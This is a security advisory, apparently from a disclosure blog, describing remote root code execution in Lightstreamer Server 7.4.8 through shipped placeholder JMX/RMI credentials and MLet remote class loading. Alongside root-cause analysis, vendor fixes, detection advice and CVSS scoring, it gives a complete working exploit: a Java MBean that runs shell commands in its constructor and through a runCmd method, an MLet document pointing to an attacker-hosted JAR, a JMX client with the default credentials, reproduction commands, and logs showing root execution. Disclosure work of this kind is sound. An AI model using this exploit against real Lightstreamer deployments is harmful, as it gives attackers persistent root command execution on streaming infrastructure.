# Lightstreamer Server 7.4.8 (build 3506 ENTERPRISE) — Shipped Placeholder JMX/RMI Credentials Combined With `MLet` Remote Class Loading Yields Remote root RCE

Advisory: https://0day-rubbish.com/blog/lightstreamer-default-creds-jmx-rmi-mlet-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

Lightstreamer Server is a commercial real-time streaming and messaging broker from Lightstreamer S.r.l. of Milan, Italy. It pushes live data — financial quotes, news, sports results, collaborative-application state — to browser and mobile clients, and in customer environments it sits in the communications path rather than beside it. The build studied here is Server 7.4.8, build 3506, ENTERPRISE edition, combined with JMS Extender 2.1.0. The product is delivered as a Java `tar.gz` archive that is unpacked and run directly on a JDK 17 runtime; the studied deployment started the `java` process as `root`.

The server exposes a JMX management plane over RMI. In the shipped configuration file `conf/lightstreamer_conf.xml`, the `<jmx><rmi_connector>` block declares a cleartext RMI listener on TCP port 8888, publishes it on every network interface, and protects it with a username/password pair whose only entries are the literal placeholders `user_changeme` and `password_changeme`. Those two strings are not generated per installation; they travel inside the distribution archive. A remote attacker who connects with them receives a complete `MBeanServerConnection`, which exposes `createMBean`. From there the chain is short: register the standard JDK class-loader MBean `javax.management.loading.MLet`, call `getMBeansFromURL` with an attacker-controlled HTTP URL, and let the server JVM download an `mlet` document plus a JAR, load the declared class and instantiate it. The MBean constructor runs inside the server process, so a single `Runtime.getRuntime().exec()` in that constructor is arbitrary command execution with the privileges of the broker — in the studied deployment, `uid=0(root)`.

There is no dependency on any native library being pre-staged on the target filesystem and no requirement for a man-in-the-middle position. Everything the attacker needs is a network path to TCP 8888 and an HTTP listener of their own to serve the JAR.

The research record documents no prior public CVE entries for this product (NVD entry count at the time of the work: zero), so this is not a re-analysis of a known issue.

## 2. Vulnerability Summary

- **Product**: Lightstreamer Server, ENTERPRISE edition
- **Version studied**: 7.4.8, build 3506, with JMS Extender 2.1.0. Other versions were not tested and are not characterized in the research record
- **Vendor**: Lightstreamer S.r.l. (Milan, Italy)
- **Component**: `<jmx><rmi_connector>` block of `conf/lightstreamer_conf.xml`, and the two JMX MBean servers published through it
- **Root cause**: the configuration file that ships inside the distribution archive hard-codes the credential pair `user_changeme` / `password_changeme`, and neither the archive nor the deployment path randomizes it; the RMI connector is published on all interfaces in cleartext; and the connector exposes full MBean-server operations, including `createMBean`, to any client that presents that pair
- **Primitive**: remote Java class loading via `javax.management.loading.MLet.getMBeansFromURL(URL)` leading to OS command execution through an MBean constructor and, afterwards, through the registered MBean's `runCmd` method
- **Authentication**: enforced (`<public>N</public>`), but satisfied by a credential that ships in the product artifact — an authentication gate whose key is public
- **Verified execution identity**: `uid=0(root)`; proof file owned by `root`, broker process owned by `root`
- **CWE**: CWE-798 primary, with CWE-502 and CWE-78 on the loading and execution steps, CWE-250 as a contributing condition, and CWE-319 as a contributing label added by this advisory's own classification
- **CVSS 3.1**: dual-scored — 9.8 with the shipped placeholder intact, 7.2 where an operator rotated the credential. Both derivations are in section 12

## 3. Authentication Boundary

The connector block as it appears in the shipped `conf/lightstreamer_conf.xml` is reproduced below exactly as recorded, with the embedded comments translated to English and the non-functional annotations preserved:

```xml
<jmx>
  <rmi_connector>
    <port ssl="N">8888</port>                          <!-- cleartext RMI, no TLS -->
    <!-- <data_port ssl="N">4444</data_port> -->        <!-- commented out: data port falls back to the same port -->
    <!-- <listening_interface>127.0.0.1</listening_interface> -->  <!-- commented out: binds 0.0.0.0, all interfaces -->
    <test_ports>Y</test_ports>
    <public>N</public>                                  <!-- credentials required -->
    <user id="user_changeme" password="password_changeme" />  <!-- shipped placeholder credential pair -->
  </rmi_connector>
</jmx>
```

Four properties of this block define the boundary:

1. `<public>N</public>` — the connector is not anonymous. Credentials are required, and the gate is genuinely enforced: connecting with an empty credential or with a wrong credential both fail with `java.lang.SecurityException: Unknown credentials`, as confirmed dynamically (section 9).
2. `<user id="user_changeme" password="password_changeme" />` — the only declared credential is a placeholder pair. The `_changeme` suffixes are an instruction to the operator, not a secret.
3. `<listening_interface>` is commented out, so the connector binds every interface; `ss -tlnp` on the studied host confirmed `*:8888`.
4. `<port ssl="N">8888</port>` — the RMI transport is cleartext, and with `<data_port>` also commented out, the connection data port is the same port.

### Credential provenance: shipped artifact, not instance-specific state

The distinction between "this credential happened to be set on the machine we tested" and "this credential ships to every customer" is the whole weight of the finding, so it was checked directly against the artifact. The verification pass compared `conf/lightstreamer_conf.xml` as extracted from the original distribution tarball against the same file on the deployed instance, and the two were byte-identical, including the `user_changeme` / `password_changeme` line. The installation path does not regenerate, randomize or prompt for that value: the placeholder pair in the archive is the placeholder pair in the running configuration. The tarball-unpack deployment model described in section 1 reinforces this — there is no installer step capable of injecting per-host randomness into the file.

On the question of forced rotation: the research record documents no first-login or first-run password-change gate for the JMX RMI credential, and none was observed. The deployed instance still accepted the placeholder pair verbatim, which by itself demonstrates that no enforced rotation occurred anywhere in the unpack-start-serve sequence for that deployment. Rotation of this credential is therefore entirely an operator responsibility, and an operator who does not read the `<jmx>` block of a several-hundred-line XML file has no signal prompting them to do so.

Two consequences follow. First, the credential is public knowledge: it is readable in the distribution archive by anyone who downloads the product. Second, the gate is real but not a barrier, since the key to it is shipped alongside the lock.

### Scope of the authenticated session

Once the placeholder pair is accepted, the client holds a full `MBeanServerConnection` against the connector — not a monitoring-only or read-only view. The same credential reaches both MBean servers published on port 8888:

- `service:jmx:rmi:///jndi/rmi://<host>:8888/jmxrmi` — the JVM platform MBean server. Domains observed: `JMImplementation`, `java.lang`, `com.sun.management`, `java.nio`, `java.util.logging`, `jdk.management.jfr`.
- `service:jmx:rmi:///jndi/rmi://<host>:8888/lsjmx` — the Lightstreamer application MBean server. Domains observed: `JMImplementation`, `com.lightstreamer`.

## 4. Attack Surface

### The differentiating capability: `createMBean`

The product also carries an HTTP-based JMX view. The qualitative difference matters and was recorded explicitly: the HTTP dashboard does not expose `createMBean`, whereas the native JMX RMI connector does. Instantiating a new MBean is precisely the operation needed to reach `MLet`, so the RMI connector turns a read-only management surface into a code-loading surface. The HTTP interface (port 8181 in the studied deployment) is a separate surface and is not used anywhere in this chain.

### Network reachability of the connector

The connector listens on `*:8888` because `<listening_interface>` is commented out in the shipped configuration, which defaults the bind address to 0.0.0.0. The studied host had no iptables rule dropping TCP 8888, so a production deployment following the documented unpack-and-run procedure presents this port to whatever network the host is attached to. There is no TLS on the transport (`ssl="N"`), so credentials cross the network in the clear as well.

### Outbound reachability

The chain requires the server JVM to fetch an attacker-supplied URL over HTTP. Nothing in the studied configuration restricts egress from the broker process, and the fetch was observed being made by the JVM itself (section 9). The attacker owns the HTTP server legitimately; no network interception is involved at any point.

### What the surface does not require

No native library, no local file placement, no adjacent-service compromise, no localhost-only hop and no user interaction. The complete attack needs a TCP path to 8888 and a TCP path back from the broker to the attacker's HTTP listener.

## 5. Sink Identification

### Sink identification

The sink is `javax.management.loading.MLet.getMBeansFromURL(URL)`.

`MLet` is the JDK's class-loader MBean, part of the standard `java.management` module. `getMBeansFromURL` implements its documented design function: fetch an `mlet` document from the supplied URL, parse the `<MLET>` entries, resolve each entry's `CODEBASE` and `ARCHIVE` attributes over HTTP, download the JAR, load the named class and instantiate it as an MBean in the running MBean server.

Instantiation is what converts a class-loading feature into an execution primitive. Java object constructors run at instantiation time, so any statement placed in the constructor of the loaded class executes in the broker's JVM at the moment `getMBeansFromURL` returns. Because the class bytes come from an attacker-served JAR, the constructor body is attacker-chosen arbitrary Java — here `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", ...})`.

### Persistence after the first execution

The sink has a second, quieter property: the instantiated MBean is registered in the MBean server and stays registered for the lifetime of the JVM. Every method it exposes becomes callable through `MBeanServerConnection.invoke`. The payload MBean in this research exposes `String runCmd(String cmd)`, which runs a shell command and returns its standard output as the invocation result. That gives the attacker an interactive command channel over the same RMI connection, with no further class loading needed.

### Why this sink is not a defect in itself

`MLet.getMBeansFromURL` is intended functionality of the JDK and is correct where the caller is trusted. The defect here is entirely in the exposure boundary: Lightstreamer publishes an MBean server that permits arbitrary MBean instantiation to any remote client that presents the credential pair the product itself ships by default.

## 6. Source Identification

### Source identification

Five attacker-controlled inputs enter the chain, in order:

1. **RMI connection credentials** — `user_changeme` / `password_changeme`, known because they are published in the distribution archive.
2. **The `createMBean` class name** — `javax.management.loading.MLet`, a fixed, standard JDK class name; not attacker-variable, but attacker-selectable because the connector allows arbitrary class instantiation.
3. **The `getMBeansFromURL` argument** — `http://<attacker>/mlet.xml`, a fully attacker-controlled URL passed as `java.net.URL`.
4. **The contents of that `mlet` document** — `<MLET CODE="..." ARCHIVE="evil.jar" CODEBASE="http://<attacker>/" NAME="..."/>`, attacker-controlled, including the codebase from which bytes are downloaded.
5. **The contents of the referenced JAR** — the payload class and its constructor body, fully attacker-controlled.

### Trust boundary crossing

Input 1 crosses the network authentication boundary. Inputs 3, 4 and 5 cross a second boundary that is normally implicit: the server JVM is induced to treat a remote, attacker-operated HTTP origin as a trusted source of executable code, with no integrity check, no signature verification and no allow-list of permitted codebases. Input 2 is the lever that opens that second boundary, and it only works because the RMI connector exposes `createMBean`.

## 7. Data Flow

```
attacker
  | 1. RMI connect to <target>:8888  (creds user_changeme / password_changeme)   [CWE-798]
  v
Lightstreamer JVM (root) — JMX RMI connector
  | 2. createMBean("javax.management.loading.MLet", DefaultDomain:type=MLet)
  v        -> MLet class-loader MBean registered in the MBean server
  | 3. invoke MLet.getMBeansFromURL("http://<attacker>/mlet.xml")                [CWE-502]
  v
attacker HTTP server
  | 4. broker JVM fetches mlet.xml then evil.jar over HTTP (legitimate outbound
  |    request to an attacker-owned origin; no man-in-the-middle)
  v
Lightstreamer JVM (root) — MLet class loader
  | 5. parse mlet document -> download JAR -> instantiate Evil MBean
  v        -> constructor runs Runtime.exec({"/bin/sh","-c","<cmd>"})             [CWE-78]
  v
uid=0(root) command execution
  + Evil MBean remains registered -> invoke runCmd("<any command>") for
    continued arbitrary command execution over the same RMI session
```

## 8. Exploit Construction

### Payload MBean

Two source files. The interface defines the management contract; the implementation carries the constructor payload and the command channel:

```java
public interface EvilMBean {
    String runCmd(String cmd);
}
```

```java
import java.io.*;
public class Evil implements EvilMBean {
    public Evil() {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",
                "id > /tmp/ls_rmi_rce_PROOF 2>&1; whoami >> /tmp/ls_rmi_rce_PROOF; "
                + "hostname >> /tmp/ls_rmi_rce_PROOF; "
                + "echo RCE_VIA_JMX_RMI_MLET >> /tmp/ls_rmi_rce_PROOF"});
        } catch (Exception e) {}
    }
    public String runCmd(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
            InputStream is = p.getInputStream(); int c; StringBuilder sb = new StringBuilder();
            while((c=is.read())!=-1) sb.append((char)c); p.waitFor();
            return sb.toString();
        } catch(Exception e) { return "ERR:"+e; }
    }
}
```

Compiled and packed into the archive the MLet document will reference:

```bash
javac EvilMBean.java Evil.java
jar cf evil.jar Evil.class EvilMBean.class
```

### The MLet document

```xml
<?xml version="1.0" encoding="UTF-8"?>
<MLET CODE="Evil" ARCHIVE="evil.jar" CODEBASE="http://127.0.0.1:9090/" NAME="DefaultDomain:type=Evil">
</MLET>
```

`CODEBASE` points at the attacker's HTTP server in a real engagement; the loopback address above reflects the dynamic-verification setup, where the attacker role was simulated on the same host. The file must be served from the same origin as `evil.jar`, since `ARCHIVE` is resolved relative to `CODEBASE`.

### The JMX client

The essential operations of the client, in order — connect with credentials, register the loader MBean, trigger the remote fetch, then use the registered payload MBean as a command channel:

```java
String url = "service:jmx:rmi:///jndi/rmi://127.0.0.1:8888/jmxrmi";
Map<String,Object> env = new HashMap<>();
env.put(JMXConnector.CREDENTIALS, new String[]{"user_changeme","password_changeme"});
JMXConnector jmxc = JMXConnectorFactory.connect(new JMXServiceURL(url), env);
MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();

ObjectName mletName = new ObjectName("DefaultDomain:type=MLet");
mbsc.createMBean("javax.management.loading.MLet", mletName);          // register the loader
mbsc.invoke(mletName, "getMBeansFromURL",
    new Object[]{new URL("http://127.0.0.1:9090/mlet.xml")},          // HTTP fetch -> constructor RCE
    new String[]{"java.net.URL"});

ObjectName evilName = new ObjectName("DefaultDomain:type=Evil");
mbsc.invoke(evilName, "runCmd", new Object[]{"id"},                   // continued arbitrary execution
    new String[]{"java.lang.String"});
```

### Reproduction steps

```bash
mkdir -p /tmp/ls_rce/www && cd /tmp/ls_rce
javac EvilMBean.java Evil.java && jar cf evil.jar Evil.class EvilMBean.class
cp evil.jar mlet.xml www/
cd www && python3 -m http.server 9090 --bind 0.0.0.0 &
cd /tmp/ls_rce && javac JMXExploit.java
java -cp . JMXExploit 127.0.0.1 8888 user_changeme password_changeme \
     http://127.0.0.1:9090/mlet.xml jmxrmi "id"
cat /tmp/ls_rmi_rce_PROOF
```

The published PoC at `exploit/lightstreamer_default_creds_jmx_rmi_mlet_rce.py` orchestrates the whole sequence: it generates the three Java sources, invokes `javac` and `jar`, starts a background HTTP server for `mlet.xml` and the payload JAR, runs the JMX client against the target, and reads back the proof file when the target is local. Host, port, credential pair, HTTP port, attacker codebase host, MBean-server path (`jmxrmi` or `lsjmx`) and command are all command-line parameters; it uses only the Python standard library plus a local JDK.

## 9. Dynamic Verification

### Environment

- Target: Lightstreamer Server 7.4.8 build 3506 ENTERPRISE with JMS Extender 2.1.0, unpacked from the distribution archive and started under JDK 17 as `root`; broker Java process `PID 1997676`, `USER root`, `COMMAND java`
- Listening state: JMX RMI on `*:8888` (all interfaces); attacker-role HTTP listener on the research host simulating an external codebase origin
- Credentials used: `user_changeme` / `password_changeme`, unchanged from the shipped configuration
- Addresses in the transcripts below are normalized: the real target is written as `127.0.0.1` (the research host reached the broker over loopback) and the machine name is written as `<lab-host>`

### Run 1 — platform MBean server (`jmxrmi`)

```
[*] connecting service:jmx:rmi:///jndi/rmi://127.0.0.1:8888/jmxrmi as user_changeme
[+] connected. domains=[JMImplementation, java.util.logging, jdk.management.jfr,
                        java.lang, com.sun.management, java.nio, DefaultDomain]
[+] MBean count=27
[+] MLet created: DefaultDomain:type=MLet
[+] getMBeansFromURL result: [Evil[DefaultDomain:type=Evil]]
[+] Evil MBean registered: DefaultDomain:type=Evil
[+] runCmd output:
uid=0(root) gid=0(root)
MARKER_OK
uid=0(root) gid=0(root)
root
<lab-host>
RCE_VIA_JMX_RMI_MLET
```

The trailing localized group field that the test system's `id` emitted under its own locale is omitted here. `getMBeansFromURL` returning `[Evil[DefaultDomain:type=Evil]]` is the loader confirming it instantiated the class from the remote JAR.

### Run 2 — application MBean server (`lsjmx`)

```
[+] connected. domains=[JMImplementation, com.lightstreamer, DefaultDomain]
[+] MBean count=24
[+] MLet created: DefaultDomain:type=MLet
[+] getMBeansFromURL result: [Evil[DefaultDomain:type=Evil]]
[+] runCmd output: uid=0(root) ... root ... RCE_VIA_JMX_RMI_MLET
```

Both published MBean servers are usable as entry points; the application server carries `com.lightstreamer` management beans in addition to the loader primitive, which is itself an exposure worth noting independently of the RCE.

### Run 3 — clean reproduction and proof-file ownership

```
[*] LS process user: 1997676 root java
[+] MLet created: DefaultDomain:type=MLet
[+] Evil MBean registered: DefaultDomain:type=Evil
[+] runCmd output: uid=0(root) ... root ... RCE_VIA_JMX_RMI_MLET
=== PROOF FILE (owner confirms root execution context) ===
-rw-r--r-- 1 root root 86 ... /tmp/ls_rmi_rce_PROOF
uid=0(root) gid=0(root)
root
<lab-host>
RCE_VIA_JMX_RMI_MLET
```

The proof file was written by the constructor without any command being issued through `runCmd`, so it is independent evidence of the instantiation-time execution. Its owner being `root:root` confirms the execution context, matching the broker process user.

### Run 4 — end-to-end orchestrator with a fresh marker

The full PoC script was run against the same instance with a distinct marker command:

```
[*] compiling malicious MBean + JMX client (javac)...
[+] compiled.
[+] attacker HTTP server on 0.0.0.0:9094 (serving evil.jar + mlet.xml)
[*] invoking JMX exploit: 127.0.0.1:8888 path=jmxrmi creds=user_changeme/password_changeme
[+] connected. domains=[JMImplementation, java.util.logging, jdk.management.jfr, java.lang,
                        com.sun.management, LS_INDEP_V2, java.nio, DefaultDomain]
[+] MLet created
[+] getMBeansFromURL: [javax.management.InstanceAlreadyExistsException: DefaultDomain:type=Evil]
[+] Evil MBean registered
[+] runCmd [id; echo FINAL_VERIFY_OK]:
uid=0(root) gid=0(root)
FINAL_VERIFY_OK
[+] PROOF FILE /tmp/ls_rmi_rce_PROOF:
    owner: root
    content: uid=0(root) gid=0(root) | root | <lab-host> | RCE_VIA_JMX_RMI_MLET |
[*] done
```

The `InstanceAlreadyExistsException` is expected on a JVM where an earlier run already registered `DefaultDomain:type=Evil`; MBeans persist for the JVM lifetime. It does not weaken the result — the already-registered payload MBean still executed the supplied command and returned `uid=0(root)`, which is itself a demonstration of the persistence property described in section 5. On a freshly started JVM the same run reports `[Evil[DefaultDomain:type=Evil]]`, as in run 1.

### Authentication gate confirmation

```
empty credentials        -> [!] auth FAILED (bad creds): java.lang.SecurityException: Unknown credentials
incorrect credentials    -> [!] auth FAILED (bad creds): java.lang.SecurityException: Unknown credentials
shipped placeholder pair -> [+] connected
```

Three-way contrast: the gate rejects anonymous access and rejects wrong secrets, and accepts exactly the pair the product ships. This isolates the defect to the credential's provenance rather than to a missing or bypassable check.

### Out-of-band proof that the JAR was really fetched

To exclude the possibility that the loader had satisfied the request from a cached artifact, a separate pass served a payload JAR under a unique filename, `evil_5425807.jar`, derived from a nanosecond timestamp that had never existed before, on a unique HTTP port 9092, with the payload MBean registered under a unique `LS_INDEP_V2:*` object-name namespace and a unique marker `LS_INDEP_V2_PROOF`. The attacker-side HTTP access log recorded the broker JVM requesting the MLet document and then the JAR, both answered 200. The subsequent `runCmd` returned `uid=0(root)` together with the unique marker, and the proof file was again owned by `root`. A name that had never been generated before cannot come from a cache.

### Adversarial validation

Two independent validation passes were run over the finding. A falsification pass attacked it along seven directions — whether the credential really ships in the artifact, whether 8888 is really remotely reachable, whether `createMBean`/`MLet` is genuinely available or merely present under a license restriction, whether the JAR was really fetched rather than cached, whether the resulting execution is truly root, whether any man-in-the-middle or local dependency is hidden in the chain, and whether the finding is really distinct from the separate JVM TI agent-load primitive we documented elsewhere in this product. All seven refutation attempts failed (recorded as NOT_REFUTED, 0.97). A second pass rebuilt the exploit from scratch in a fresh workspace with unique markers, ports and object names, and reproduced root execution independently (recorded as CONFIRMED, 0.99). On the license question specifically, the rebuild enumerated 30 MBeans across 8 domains with full JMX feature availability, establishing that `createMBean` and `MLet` were not restricted by the ENTERPRISE license state.

## 10. Reachability and Security Impact

### Reachability

Read as an assessment of the shipped deployment topology, the chain is remote end to end, and that assessment rests on the product's default production deployment shape rather than on anything specific to the test machine. It is an assessment rather than an observation of a cross-network attack: as section 9 records, the research host reached the broker over loopback and the attacker HTTP role was simulated on the same host.

- TCP 8888 binds `0.0.0.0` because `<listening_interface>` is commented out in the shipped configuration; `ss -tlnp` confirmed `*:8888`. The falsification pass checked the host firewall and found no rule dropping 8888. On that shipped bind, and with no such rule present, any host holding a network path to the port is in a position to initiate the connection.
- On the shipped topology the attacker initiates the RMI connection from outside the host. That follows from the bind address and the absent firewall rule, not from a run observed crossing a network boundary.
- The broker initiates the HTTP fetch of the MLet document and JAR outward to the attacker's origin; the attacker legitimately operates that origin, so this is ordinary egress, not interception. In verification that origin was simulated on the research host.
- The chain itself stages no native library on the target and involves no auxiliary service; the only element of the lab setup that does not appear in a real deployment is the simulated attacker origin.

The one genuine precondition is that the operator has not replaced the shipped placeholder pair. Section 12 scores both states separately.

### Impact assessment

- **Confidentiality**: `runCmd` returns command output directly as the RMI invocation result, so any file readable by `root` is exfiltrated interactively — broker configuration, TLS material and keystores, the full `lightstreamer_conf.xml` including any other credentials configured in it, and the streamed application data transiting the broker.
- **Integrity**: the broker is a communications component. Arbitrary write access at `root` means configuration, adapter code and the JAR/class inventory of the server itself can be modified, and the loader MBean remains registered for the JVM's lifetime, giving durable code-execution capability without re-exploitation. The `com.lightstreamer` MBeans reachable through `lsjmx` additionally allow manipulation of the server's own runtime state.
- **Availability**: the process and the host can be stopped or degraded at will; a streaming broker in a market-data or collaboration path is a single point of failure for every client downstream of it.
- **Execution identity**: `uid=0(root)` in the studied deployment, where the broker ran as root — a configuration the product's unpack-and-run packaging does nothing to discourage. Under any other service account the primitive holds; the account's privileges then set the blast radius.
- **Pivot**: because the product is communications infrastructure, root on the broker places the attacker inside the trust zone of every system that consumes its streams, and the cleartext RMI transport (CWE-319, a label added by this advisory's own classification) exposes the placeholder credential to anyone who can observe port 8888 traffic even without reaching it.

## 11. Fix Recommendations

### Vendor fixes

1. **Do not ship a usable placeholder credential.** Generate a random JMX RMI credential pair during deployment, or ship the `<user>` element absent or commented out so that enabling the connector forces the operator to supply a secret. A value that both ships and authenticates is a credential regardless of its name, and the `_changeme` suffix communicates intent but enforces nothing.
2. **Enforce rotation if a placeholder is retained.** If a documented default must exist for first-run convenience, gate it: refuse to accept the placeholder pair after first successful start, or make the server log a prominent startup error and refuse to publish the RMI connector while the value is unchanged.
3. **Bind the connector to loopback by default.** Ship `<listening_interface>127.0.0.1</listening_interface>` uncommented, so remote publication becomes an explicit operator decision rather than the consequence of a commented line.
4. **Remove or restrict the remote class-loading capability.** Refuse registration of `javax.management.loading.MLet` on a production connector, or restrict `getMBeansFromURL` to a configured allow-list of trusted codebases (for example local `file://` paths) instead of arbitrary HTTP origins. A monitoring connector has no operational need to download classes at runtime.
5. **Do not expose `createMBean` on the management connector.** The HTTP dashboard's inability to instantiate MBeans is the right posture; the RMI connector should offer the read-and-monitor subset by default and require an explicit flag for write operations.
6. **Encrypt the management transport.** Default `<port ssl="Y">` with mutual authentication, so the credential does not cross the network in cleartext.
7. **Drop the root execution context.** Package the server to run under a dedicated unprivileged account, and document it as the supported configuration, so that a management-plane compromise does not become host compromise by default.

### Operator hardening pending a fix

1. Replace `user_changeme` / `password_changeme` in `conf/lightstreamer_conf.xml` immediately, and audit every deployment for the literal strings.
2. Set `<listening_interface>` to `127.0.0.1`, or block TCP 8888 at the host and network firewall to permit only administrative hosts.
3. Set `<public>Y</public>` only if the connector must stay open and monitoring consumers require no credential — but note this removes the gate entirely; firewalling is the safer control.
4. Enable TLS on the connector and move the broker off `root`.
5. Alert on new MBean registrations under non-standard domains (for example `DefaultDomain:type=MLet`), on outbound HTTP requests from the broker JVM to non-inventory origins, and on any `getMBeansFromURL` invocation.

## 12. CWE and CVSS

### CWE mapping

- **CWE-798 — Use of Hard-coded Credentials** (primary root cause). The credential pair is embedded in a configuration file that ships inside the distribution archive and is not randomized by any install step; artifact comparison confirmed the archive copy and the deployed copy are byte-identical.
- **CWE-502 — unsafe deserialization / loading of untrusted content** as recorded for the `getMBeansFromURL` step: the JVM loads and instantiates bytecode from a remote origin with no integrity verification and no codebase allow-list.
- **CWE-78 — OS Command Injection**, at the point where the loaded MBean passes an attacker-influenced command string to `/bin/sh -c` through `Runtime.exec`.
- **CWE-319 — Cleartext Transmission of Sensitive Information.** This label is added by this advisory's own classification; the CWE set recorded in the research for this finding is CWE-798, CWE-502, CWE-78 and CWE-250. The fact behind the label is recorded: the shipped connector declares `<port ssl="N">8888</port>`, i.e. a plaintext RMI transport with no TLS, so the management credential traverses the network unencrypted.
- **CWE-250 — Execution with Unnecessary Privileges**, contributed by the broker running as `root`, which escalates the consequence of the RCE from application-level to host-level.

### CVSS derivation A — shipped placeholder credential left unchanged

This scores the state the product produces on its own, after an unpack-and-run deployment in which the operator has not edited the `<jmx>` block. The placeholder pair is published in the distribution archive, so every attacker possesses the required secret without any prior access; the "privileges required" metric is therefore scored as None rather than High, because no privilege has to be obtained — the credential is part of the product, not a barrier to it.

- Vector components: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **CVSS 3.1 base score: 9.8 (Critical)**
- Rationale: network-reachable connector on all interfaces (AV:N); no special conditions beyond a live broker and an attacker HTTP listener (AC:L); public shipped credential (PR:N); no victim interaction (UI:N); full command execution at the broker's privilege, verified as root in the studied deployment (C:H/I:H/A:H).

### CVSS derivation B — operator rotated the placeholder credential

This scores the same code path on a deployment where the operator replaced `user_changeme` / `password_changeme` with a secret of their own. The RMI connector still exposes `createMBean` and still permits `MLet` instantiation, so any principal holding a valid JMX credential — an administrator account whose credential leaks, or anyone who observes it on the cleartext RMI transport — still obtains arbitrary remote class loading and host command execution. Because a JMX credential is the key to the entire MBean server, the required privilege is scored High.

- Vector components: `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
- **CVSS 3.1 base score: 7.2 (High)**
- Rationale: unchanged network reachability and complexity; a valid non-public credential is now required (PR:H); impact remains complete because `MLet` instantiation is unrestricted for any authenticated principal.

Two notes on these derivations. First, derivation B does not depend on the credential being weak — rotating the password closes the CWE-798 root cause but leaves the class-loading capability exposed, which is why the score stays in the High band rather than dropping to informational. Second, derivation A assumes the shipped bind behaviour; an operator who uncomments `<listening_interface>127.0.0.1</listening_interface>` changes the attack vector to Local, and an operator who blocks 8888 at the network edge removes remote reachability altogether. Both are configuration choices the product does not make for them.

### Independence

The research record documents no prior public CVE entries against Lightstreamer Server — the NVD entry count for this product was zero when the work was performed. Nothing in this finding re-analyzes, re-scores or extends a previously published vulnerability, and the advisory therefore claims no relationship to any public CVE.

The finding is also independent of the other primitive we documented in this product line, which used the HTTP management interface on port 8181 to reach a JVM TI agent-load operation and required a native library to be present on the target filesystem. This chain differs on entry point (the RMI connector on 8888, not the HTTP interface), on mechanism (remote Java class loading of an HTTP-served JAR, not loading of a local native agent), and on prerequisites (no native artifact on the target at any point). Sharing a product does not make two findings the same finding.
